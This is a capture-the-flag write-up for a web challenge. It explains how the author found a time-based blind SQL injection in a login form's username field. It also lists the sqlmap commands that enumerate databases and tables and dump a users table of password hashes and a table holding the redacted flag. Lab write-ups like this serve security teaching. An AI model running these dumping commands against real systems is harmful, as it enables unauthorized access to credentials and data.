# Productivity Request

**Category**: Web

**Points**: 350pts

**TL;DR:** SQLi on the login endpoint to dump the DB contents. 💾💉⬇️📜

**Solution:**
As this challenge did not provide any sources and we only had two input fields, our first thought was to look for SQLi. Using sqlmap we discovered that ***the username parameter was vulnerable to [time-based blind SQLi.](https://beaglesecurity.com/blog/vulnerability/time-based-blind-sql-injection.html)*

As we had a time-based blind  SQLi, each injection took a couple of minutes to return the desired information. However, as we were not sure what we were looking for, we went step by step, searching through all available databases until we finally focused on the requestdb.

Getting the DBs:

	sqlmap -r login.txt --flush-session --dbms MySql --dbs 

- information_schema
- requestdb
- test (which was empty)

Getting the tables in requestdb:
	
	sqlmap -r login.txt --flush-session --dbms MySql -D requestdb --tables 

-  requestlist
- users

Dumping the data in the user table:
	
	sqlmap -r login.txt --flush-session -D requestdb --dbms MySql --dump -T users 

| id  | password                         | username  | 
| --- | -------------------------------- | --------- |
| 1   | 81b02809a35976b5f98ce12bb9dd9ba9 | user34531 |
| 2   | 275206a266635e02f1a5134472652683 | admin     |

This, of course, caught our attention, but checking the hashes did not produce any passwords. So we moved on to ***dump the data in the requestlist table***, which gave us the flag.

	sqlmap -r login.txt --flush-session -D requestdb --dbms MySql --dump -T requestlist 

| id  | product                     | approved | location | receiver |
| --- | --------------------------- | -------- | -------- | -------- |
|     |                             | .        |          |          |
|     |                             | .        |          |          |
|     |                             | .        |          |          |
| 8   | HTB{______Redacted_______}  | 0        | HTBland  | HTBer    |
